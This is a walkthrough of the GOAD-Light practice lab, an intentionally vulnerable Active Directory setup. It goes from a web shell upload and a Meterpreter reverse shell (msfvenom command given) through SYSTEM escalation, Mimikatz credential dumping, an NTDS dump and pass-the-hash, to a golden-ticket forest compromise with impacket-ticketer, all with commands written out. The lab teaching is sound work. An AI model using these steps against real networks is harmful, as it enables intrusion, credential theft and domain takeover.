---
title: "Game of Active Directory Light writeup"
date: 2026-07-08 12:50:00 +0200
categories: [GOAD]
tags: [GOAD, GOAD-Light, SeImpersonate, Golden ticket]
---

Hello and welcome to my GOAD-Light writeup. **Game of Active Directory (GOAD)** is a free, open-source pentesting lab project created by Orange Cyberdefense that provides an intentionally vulnerable Active Directory environment for practicing attack techniques. Check out the repo here: [github.com/Orange-Cyberdefense/GOAD](https://github.com/Orange-Cyberdefense/GOAD). Hope you learn something new reading this.

## 1. Scope
We have three machines in scope:

1. **192.168.56.220** — Domain Controller 1 (KINGSLANDING, `sevenkingdoms.local`)
2. **192.168.56.221** — Domain Controller 2 (WINTERFELL, `north.sevenkingdoms.local` — a child domain)
3. **192.168.56.222** — a member server (CASTELBLACK, castelblack.north.sevenkingdoms.local)


Let's start with an Nmap scan against each host.

### DC01 — KINGSLANDING (192.168.56.220)

![Nmap scan of DC01](/assets/goad-light-img/2-1.png)
*Nmap scan of DC01 (KINGSLANDING)*

Ports 53, 88, and 389 are default for Active Directory domain controller (DNS, Kerberos, LDAP). We also see port 80 (HTTP) and the machine's fully qualified domain name, which will be useful later. Port 3389 is RDP, and 5985 is WinRM.

### DC02 — WINTERFELL (192.168.56.221)

![Nmap scan of DC02](/assets/goad-light-img/2-2.png)
*Nmap scan of DC02 (WINTERFELL)*

We see the same set of ports, minus HTTP, and a different domain name — `north.sevenkingdoms.local` — suggesting a parent/child domain relationship worth investigating further.

### SRV02 — CASTELBLACK (192.168.56.222)

![Nmap scan of SRV02](/assets/goad-light-img/2-3.png)
*Nmap scan of SRV02 (CASTELBLACK)*

This one isn't a domain controller, but it does expose an HTTP port again. Before poking at the website or trying null authentication, we can use NetExec (`nxc`) to enumerate every domain name in the subnet and write them straight into a hosts file.

```bash
nxc smb 192.168.56.1/24 --generate-hosts-file hosts
```

![nxc generate-hosts-file output](/assets/goad-light-img/2-4.png)
*Generating a hosts file with nxc, discovering all three domain-joined machines*

After adding these entries to `/etc/hosts`, we can browse to each site by name. Let's start with DC01.

![Default IIS page on DC01](/assets/goad-light-img/2-5.png)
*DC01 (kingslanding.sevenkingdoms.local) — a default IIS landing page, nothing interesting here*

Just the default IIS page. Let's check SRV02 instead.

![File uploader landing page on SRV02](/assets/goad-light-img/2-6.png)
*SRV02 (castelblack.north.sevenkingdoms.local) — a custom page inviting file uploads*

That's more interesting. Clicking "this link" redirects us to a `Default.aspx` page.

---

## 2. Initial Access — File Upload on SRV02

![File uploader form on Default.aspx](/assets/goad-light-img/2-7.png)
*A simple file uploader on Default.aspx*

Every file we upload lands in the `/uploads/` folder. Since this is IIS, we can upload a `shell.aspx` web shell to gain code execution on the machine. A ready-made one is available in SecLists: [shell.aspx (laudanum)](https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/laudanum-1.0/aspx/shell.aspx).

Before uploading, we need to edit the allowed-IP check baked into the shell so that our attacking IP is permitted to use it:

![Editing the allowedIps array in shell.aspx](/assets/goad-light-img/2-8.png)
*Adding our attacker IP to the allowedIps array before uploading*

Now we can upload the web shell.

![shell.aspx uploaded successfully](/assets/goad-light-img/2-9.png)
*shell.aspx uploaded successfully*

We now have code execution on the machine.

![whoami output showing iis apppool\defaultapppool](/assets/goad-light-img/2-10.png)
*whoami confirms we're running as iis apppool\defaultapppool*

## 3. Privilege Escalation — SeImpersonatePrivilege

Checking our current privileges, we find `SeImpersonatePrivilege` enabled. This is a dangerous privilege to hold, because it can be abused with one of the "potato" exploits or with PrintSpoofer to escalate straight to `NT AUTHORITY\SYSTEM`.

![whoami /priv showing SeImpersonatePrivilege enabled](/assets/goad-light-img/2-11.png)
*whoami /priv — SeImpersonatePrivilege is enabled*

First, we need a proper reverse shell so we can pull down tools like PrintSpoofer or a Meterpreter binary. I used [revshells.com](https://www.revshells.com/) with the PowerShell #3 (Base64) payload.

![revshells.com PowerShell Base64 payload generator](/assets/goad-light-img/2-12.png)
*Generating a Base64-encoded PowerShell reverse shell payload*

Set up a listener, then paste the payload into the web shell's command box.

![Netcat listener receiving the reverse shell](/assets/goad-light-img/2-13.png)
*Catching the reverse shell as iis apppool\defaultapppool*

For the easiest path from SeImpersonatePrivilege to SYSTEM, I'll use Meterpreter's built-in `getsystem`.

### From defaultapppool to NT AUTHORITY\SYSTEM

**1.** Generate a Meterpreter executable:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=9001 -f exe -o meterpreter.exe
```

![msfvenom generating meterpreter.exe](/assets/goad-light-img/2-14.png)
*Generating meterpreter.exe with msfvenom*

**2.** Upload it to the target. A quick Python HTTP server on our attacking box plus `wget` on the target does the trick.

![wget pulling meterpreter.exe, served by python http.server](/assets/goad-light-img/2-15.png)
*Serving meterpreter.exe locally and pulling it onto the target with wget*

**3.** Set up the Metasploit multi/handler listener (again, copy-pasted from revshells.com):

![Selecting msfconsole listener type on revshells.com](/assets/goad-light-img/2-16.png)
*Grabbing the matching msfconsole multi/handler one-liner*

**4.** Run `meterpreter.exe` on the target and catch the session:

![Meterpreter session opened](/assets/goad-light-img/2-17.png)
*Meterpreter session established after executing the payload*

**5.** Run `getsystem`:

![getsystem and getuid confirming NT AUTHORITY\SYSTEM](/assets/goad-light-img/2-18.png)
*getsystem succeeds via named-pipe impersonation (PrintSpoofer variant) — we're now SYSTEM*


## 4. From SRV02 to DC02

With a SYSTEM-level Meterpreter session, we can load the Kiwi (Mimikatz) extension to dump credentials directly from memory.

![load kiwi in Meterpreter](/assets/goad-light-img/2-19.png)
*Loading the Kiwi extension*

Running `creds_all` dumps every credential Mimikatz can find. We get the NTLM hash for `robb.stark`, our first domain user.

![creds_all output listing NTLM hashes](/assets/goad-light-img/2-20.png)
*creds_all reveals the NTLM hash for robb.stark*

Cracking this hash on [crackstation.net](https://crackstation.net/) recovers the plaintext password.

![Crackstation cracking the NTLM hash](/assets/goad-light-img/2-21.png)
*The NTLM hash cracks instantly against crackstation's dictionary*

Let's check whether these credentials are valid anywhere else on the network:

![nxc smb authentication check across the subnet](/assets/goad-light-img/2-22.png)
*robb.stark's credentials work across the north.sevenkingdoms.local domain — Pwn3d! on WINTERFELL (DC02)*

We get **Pwn3d!** on DC02. From here we can use `nxc` with `--ntds` to dump the entire `NTDS.dit` database for the child domain.

![nxc dumping NTDS.dit hashes](/assets/goad-light-img/2-23.png)
*Dumping NTDS.dit from DC02 — including the Administrator NTLM hash*

With the Administrator NTLM hash in hand, we authenticate via Pass-the-Hash:

![nxc pass-the-hash as Administrator](/assets/goad-light-img/2-24.png)
*Pass-the-Hash as north\Administrator succeeds on CASTELBLACK and WINTERFELL*

## 5. From DC02 to DC01 — Golden Ticket

We can authenticate on DC02 and SRV02 because they both live in the `north.sevenkingdoms.local` child domain. DC01, however, sits in the parent domain `sevenkingdoms.local`. Because a child domain implicitly trusts its parent (and vice versa, via the transitive Kerberos trust that Active Directory creates between domains in the same forest), compromising the child domain's KRBTGT account gives us everything we need to forge tickets that the parent domain will accept — without ever touching DC01 directly.

That's exactly what a **Golden Ticket** attack does: it forges a Ticket Granting Ticket (TGT) using the stolen KRBTGT hash, letting us impersonate any user in the domain — including, via SID history injection, Domain Admins in the parent forest.

To build one, we need five pieces of information:

1. KRBTGT NTLM hash
2. SID of the child domain
3. Target username
4. Fully-qualified name of the child domain
5. SID of the Enterprise Admins group in the parent domain

We already have three of these: the KRBTGT hash (`2171e29fad5a3133f146073d6e83bb5b`, recovered in the NTDS dump above), the target username (`administrator`), and the child domain FQDN (`north.sevenkingdoms.local`). We still need the child domain's SID and the parent domain's Enterprise Admins group SID — both obtainable with `impacket-lookupsid`.

**Child domain SID:**

```bash
impacket-lookupsid -hashes ":dbd13e1c4e338284ac4e9874f7de6ef4" north.sevenkingdoms.local/administrator@192.168.56.221 | grep "Domain SID"
```

![impacket-lookupsid returning the child domain SID](/assets/goad-light-img/2-25.png)
*Recovering the child domain SID with impacket-lookupsid*

**Enterprise Admins SID (parent domain):**

```bash
impacket-lookupsid -hashes ":dbd13e1c4e338284ac4e9874f7de6ef4" north.sevenkingdoms.local/administrator@192.168.56.220 | grep -B12 "Enterprise Admins"
```

![impacket-lookupsid returning the Enterprise Admins group SID](/assets/goad-light-img/2-26.png)
*Recovering the parent domain's Enterprise Admins group SID (RID 519)*

With everything in hand, we forge the ticket using `impacket-ticketer`:

```bash
impacket-ticketer -nthash 2171e29fad5a3133f146073d6e83bb5b -domain north.sevenkingdoms.local -domain-sid S-1-5-21-837191423-2566334982-314057967 -extra-sid S-1-5-21-452540812-4129900423-3849272436-519 Administrator
```

![impacket-ticketer generating the golden ticket](/assets/goad-light-img/2-27.png)
*impacket-ticketer forges the Golden Ticket and saves it as Administrator.ccache*

Finally, pointing `KRB5CCNAME` at the forged ticket and using `--use-kcache` with `nxc`:

![nxc using the golden ticket to authenticate to DC01 as Domain Admin](/assets/goad-light-img/2-28.png)
*Pwn3d! on 192.168.56.220 (DC01) — full forest compromise*

We land **Pwn3d!** on 192.168.56.220 (DC01), completing full domain and forest compromise.


## 6. Tools used:
**1.** [Nmap](https://nmap.org)

**2.** [Impacket](https://github.com/fortra/impacket)

**3.** [Metasploit-framework](https://github.com/rapid7/metasploit-framework)

**4.** [nxc,NetExec](https://github.com/Pennyw0rth/NetExec)

**5.** [Seclists](https://github.com/danielmiessler/seclists)


## 7. Conclusion

Thanks for reading. There are many other valid paths to Domain Admin in this lab — this was just one of them. See you in the next writeup.